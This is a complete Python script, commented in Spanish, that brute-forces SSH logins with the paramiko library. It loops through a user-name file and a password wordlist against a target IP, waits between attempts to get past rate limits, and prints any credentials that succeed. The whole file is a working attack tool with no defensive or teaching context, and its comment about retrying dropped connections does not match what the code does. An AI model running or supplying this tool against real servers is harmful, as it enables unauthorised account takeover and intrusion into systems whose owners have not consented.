import paramiko
import argparse
import time

parser = argparse.ArgumentParser(description="SSH Brute Force")
parser.add_argument("-t", "--target", required=True, help="IP Objetivo")
parser.add_argument("-U", "--username", required=True, help="Archivo de usuarios")
parser.add_argument("-w", "--wordlist", required=True, help="Wordlist de passwords")
args = parser.parse_args()

with open(args.username, "r") as f:
    usuarios = [linea.strip()for linea in f]

with open(args.wordlist, "r") as f:
    palabras = [linea.strip() for linea in f]

print(f"\n[*] Iniciando SSH brute force en {args.target}\n")

encontrado = False

for usuario in usuarios:
    for password in palabras:
        try:
            cliente = paramiko.SSHClient()
            cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            cliente.connect(args.target, port=22, username=usuario, password=password, timeout=3)
            print(f"[+] CREDENCIALES ENCONTRADAS -> {usuario}:{password}")
            cliente.close()
            encontrado = True
            break
        except paramiko.AuthenticationException:
            print(f"[-] Fallido -> {usuario}:{password}")
            time.sleep(3) #delay entre intentos
        except Exception:
            print(f"[!] Conexion cortada - reintentando {usuario}:{password}")
            time.sleep(2) #delay mas largo si hay reset
            continue #reintenta en lugar de saltar al siguiente
    if encontrado:
        break